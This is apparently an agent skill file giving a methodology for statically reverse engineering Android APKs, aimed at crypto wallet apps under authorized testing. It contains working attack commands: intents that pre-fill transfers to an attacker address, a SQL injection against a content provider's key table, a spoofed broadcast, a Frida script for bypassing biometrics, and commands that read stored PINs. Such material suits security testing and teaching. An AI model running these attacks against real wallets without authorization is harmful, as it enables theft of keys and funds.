---
name: android-apk-reversing
description: "Android APK static reverse engineering methodology for authorized security testing of mobile apps. Complements android-dynamic-analysis.md (Frida runtime hooks). Covers: APK extraction (adb pull, PM path), jadx decompilation + obfuscation bypass (string-based, import-based, manifest-based, JNI function names), AndroidManifest.xml security analysis (exported components, backup flag, cleartext traffic, permissions), systematic static search patterns (30+ grep patterns for key storage, crypto, auth, networking, WebView, logging), exported component exploitation (exported Activities via adb am start, deep links/app links, Content Providers via content query + SQLi, Broadcast Receivers), biometric bypass (event-based vs crypto-bound detection, Frida onAuthenticationSucceeded hook), PIN/client-side validation bypass, native library analysis (nm, readelf, strings, Ghidra). Focus: crypto wallet apps (key storage, signing, transaction verification)."
trigger_keywords: "android apk, apk reverse engineering, jadx decompile, apk decompile, androidmanifest, exported activity, exported component, content provider attack, broadcast receiver attack, deep link attack, app link attack, biometric bypass android, fingerprint bypass, frida android, adb am start, android static analysis, obfuscation bypass, proguard reverse, android keystore, shared preferences keys, android crypto app, intent attack, android deep link, android backup, ssl pinning android, apk extraction"
version: 1.0
created: 2026-02-25
owner: cyber-operator
---

# Android APK Reverse Engineering — Static Analysis Methodology

> Complements `android-dynamic-analysis.md` (Frida hooks, dynamic analysis)
> Focus: static analysis, exported component attacks, crypto app specific patterns

---

## APK Extraction

```bash
# From device/emulator:
adb shell pm list packages | grep examplewallet
adb shell pm path com.examplewallet.android
# Output: package:/data/app/~~hash/com.examplewallet.android-hash/base.apk
adb pull /data/app/~~hash/com.examplewallet.android-hash/base.apk examplewallet.apk

# Split APKs (large apps have multiple):
# Pull base.apk + all split_config.*.apk files listed by pm path

# Verify integrity: check signing certificate matches Play Store
apksigner verify --print-certs examplewallet.apk
```

---

## Decompilation with jadx

```bash
# CLI decompilation:
jadx -d output_dir/ target.apk

# Output: output_dir/sources/ (Java), output_dir/resources/ (XML, assets)
# AndroidManifest.xml is in output_dir/resources/

# GUI mode (for large apps — cross-references, search, deobfuscation):
jadx-gui target.apk

# Native libraries — in APK under lib/:
unzip target.apk 'lib/**/*.so' -d libs/
nm -D libs/arm64-v8a/libmpc.so | grep -i "sign\|key\|nonce\|ecdsa"
strings libs/arm64-v8a/libmpc.so | grep -i "error\|fail\|key\|sign"
# For deep analysis: Ghidra (ARM64 assembly)
```

---

## Obfuscation Bypass Strategies

```
ProGuard/R8 renames classes/methods/fields. Strings are NOT obfuscated.

1. String-based identification:
   grep -rn "mnemonic\|seed phrase\|private key\|Failed to sign" sources/
   → Find the security-critical class by its string literals

2. Import-based:
   grep -rn "javax.crypto\|android.security.keystore\|java.security" sources/
   → These classes import crypto primitives → trace inward

3. Manifest-based:
   Activity/Service/Receiver names in AndroidManifest.xml are NOT obfuscated
   → Start from manifest component names, trace into obfuscated code

4. JNI function names (native libraries):
   nm -D libmpc.so | grep "Java_"
   # Pattern: Java_com_examplewallet_android_ClassName_methodName
   → Reveals original class and method names before obfuscation
```

---

## AndroidManifest.xml — Critical Analysis

```xml
<!-- Security-relevant flags to check: -->
<application
  android:debuggable="false"           <!-- true → attach debugger → CRITICAL -->
  android:allowBackup="true"           <!-- true → adb backup extracts app data -->
  android:usesCleartextTraffic="false" <!-- true → HTTP allowed → check network config -->
  android:networkSecurityConfig="@xml/network_security_config">

<!-- Exported components = accessible to any app on device -->
<activity
  android:name=".DeepLinkActivity"
  android:exported="true">
  <intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="examplewallet" android:host="send"/>
  </intent-filter>
</activity>

<provider
  android:name=".data.WalletProvider"
  android:exported="true"
  android:readPermission="none"      <!-- No permission to read wallet data! -->
  android:authorities="com.examplewallet.wallet"/>
```

**Manifest grep targets:**

```bash
grep -n 'exported="true"' resources/AndroidManifest.xml
grep -n 'intent-filter' resources/AndroidManifest.xml
grep -n 'android:scheme' resources/AndroidManifest.xml
grep -n 'allowBackup\|debuggable\|cleartextTraffic' resources/AndroidManifest.xml
```

---

## Static Search Patterns (30+ Critical)

```bash
# === KEY STORAGE & CRYPTO ===
grep -rn "KeyStore\|getKey\|generateKey\|SecretKey\|PrivateKey" sources/
grep -rn "SharedPreferences" sources/ | grep -i "key\|secret\|token\|password"
grep -rn "Cipher\|encrypt\|decrypt\|AES\|RSA" sources/
grep -rn "SecureRandom\|Random()" sources/  # Random() = weak RNG!
grep -rn "setUserAuthenticationRequired" sources/  # Biometric binding check

# === AUTHENTICATION ===
grep -rn "BiometricPrompt\|FingerprintManager\|CryptoObject" sources/
grep -rn "PIN\|passcode\|password" sources/ | grep -iv "forgot\|reset\|hint"

# === NETWORK SECURITY ===
grep -rn "TrustManager\|X509TrustManager\|SSLSocketFactory" sources/
grep -rn "AllowAllHostnameVerifier\|ALLOW_ALL\|setHostnameVerifier" sources/
grep -rn "OkHttpClient" sources/ | grep -i "trust\|cert\|pin"

# === SENSITIVE LOGGING (data leak) ===
grep -rn "Log\.\|println\|System\.out" sources/ | grep -i "key\|token\|password\|secret"

# === DATA STORAGE ===
grep -rn "SQLiteDatabase\|openOrCreateDatabase\|getWritableDatabase" sources/
grep -rn "Room\|@Entity\|@Dao" sources/

# === WEBVIEW (XSS surface) ===
grep -rn "WebView\|loadUrl\|setJavaScriptEnabled\|addJavascriptInterface" sources/

# === WEAK RNG (critical for crypto apps) ===
grep -rn "new Random()\|Math.random()" sources/  # Not cryptographically secure
grep -rn "System.currentTimeMillis\|System.nanoTime" sources/ | grep -i "seed\|random"
```

---

## Exported Component Exploitation

### Exported Activity (Intent Attack)

```bash
# List all exported activities:
aapt dump xmltree target.apk AndroidManifest.xml | grep -B5 'exported.*true'

# Launch with crafted Intent (pre-fill transaction):
adb shell am start -n com.examplewallet.android/.SendActivity \
  -d "examplewallet://send?to=ATTACKER_ADDR&amount=1.0&currency=ETH"

# App link test (from "trusted" domain):
adb shell am start -W -a android.intent.action.VIEW \
  -d "https://examplewallet.example.com/app/send?to=ATTACKER&amount=10"

# If Activity auto-fills send details without user confirmation → Critical
# If no validation of Intent source → transaction pre-population
```

### Content Provider Exploitation

```bash
# Query exported Content Provider (no auth required):
adb shell content query --uri content://com.examplewallet.wallet/accounts
adb shell content query --uri content://com.examplewallet.wallet/transactions
adb shell content query --uri content://com.examplewallet.wallet/keys  # ← Critical

# SQLi in Content Provider:
adb shell content query \
  --uri "content://com.examplewallet.wallet/accounts" \
  --where "1=1) UNION SELECT * FROM keys--"

# Impact if data returned: wallet data exposure via IPC = High/Critical
```

### Broadcast Receiver Exploitation

```bash
# Spoof transaction confirmation to receiver:
adb shell am broadcast -a com.examplewallet.TRANSACTION_COMPLETE \
  --es txid "fake_txid_attacker" \
  --es status "confirmed"

# If receiver processes without verifying sender → spoofed confirmation
```

---

## Biometric Authentication Bypass

### Detect Weak vs Strong Implementation

```java
// WEAK (event-based) — hookable with Frida:
biometricPrompt.authenticate(promptInfo);  // No CryptoObject
// In callback: just calls navigateToWallet() — no crypto binding

// STRONG (crypto-bound) — requires Keystore bypass:
Cipher cipher = ...;
BiometricPrompt.CryptoObject cryptoObject = new CryptoObject(cipher);
biometricPrompt.authenticate(promptInfo, cryptoObject);
// On success: result.getCryptoObject().getCipher() → decrypts key material
```

```bash
# Static check:
grep -rn "authenticate(" sources/ | grep -i "biometric\|fingerprint"
grep -rn "CryptoObject" sources/
# If authenticate() called WITHOUT CryptoObject → weak implementation
# If setUserAuthenticationRequired(false) → key not biometric-bound
```

### Frida Bypass (Weak Implementation)

```javascript
// Hook onAuthenticationSucceeded to bypass:
Java.perform(function() {
    var callback = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
    callback.onAuthenticationSucceeded.implementation = function(result) {
        console.log("[*] Biometric bypassed");
        this.onAuthenticationSucceeded(result);
    };
});
// Run: frida -U -f com.examplewallet.android -l bypass_bio.js --no-pause
```

### PIN/Client-Side Bypass

```bash
# Find client-side PIN validation:
grep -rn "pinCheck\|validatePin\|verifyPin\|checkPassword" sources/

# If PIN stored in SharedPreferences → readable on rooted device:
adb shell cat /data/data/com.examplewallet.android/shared_prefs/*.xml

# If validated client-side → Frida hook the comparison to always return true
```

---

## Crypto App Key Storage Decision Tree

```
Where are private keys / seed phrases stored?

Is it Android Keystore (hardware-backed)?
  → STRONG — keys never leave secure hardware
  → Check: setUserAuthenticationRequired(true)?
  → Check: setInvalidatedByBiometricEnrollment(true)?
  → Still test: is the biometric binding event-based or crypto-bound?

Is it in SharedPreferences?
  → WEAK — plaintext XML readable on rooted device
  → Check: is it encrypted? With what key?
  → If encrypted: where is the encryption key stored?

Is it in SQLite?
  → Check: is the DB encrypted (SQLCipher)?
  → If encrypted: where is the DB password stored?

Is it in files (app's private directory)?
  → Check: /data/data/com.package/ on rooted device
  → Check: file permissions

Is it in memory only?
  → Better practice, but: Frida memory scan can still find it
  → See android-dynamic-analysis.md for memory scanning
```

---

## Toolchain

| Tool | Purpose |
|------|---------|
| jadx / jadx-gui | APK → Java source decompilation |
| apktool | Resource decoding, smali patch, repackage |
| aapt | APK resource inspection |
| adb | Device interaction, am start, content queries |
| Frida | Dynamic instrumentation (see android-dynamic-analysis.md) |
| objection | Frida-powered exploration: `android sslpinning disable` |
| Ghidra | Native .so reverse engineering (ARM64 assembly) |

---

## Escalation Path

For runtime hooks, memory scanning, and deeper Frida automation:
→ See `android-dynamic-analysis.md`

For SSL pinning bypass scripts and full Frida setup:
→ See `android-dynamic-analysis.md` Section: Cert Pinning Bypass

*Crypto-Native Batch CN-2 | ingested 2026-02-25 | Complements android-dynamic-analysis.md*
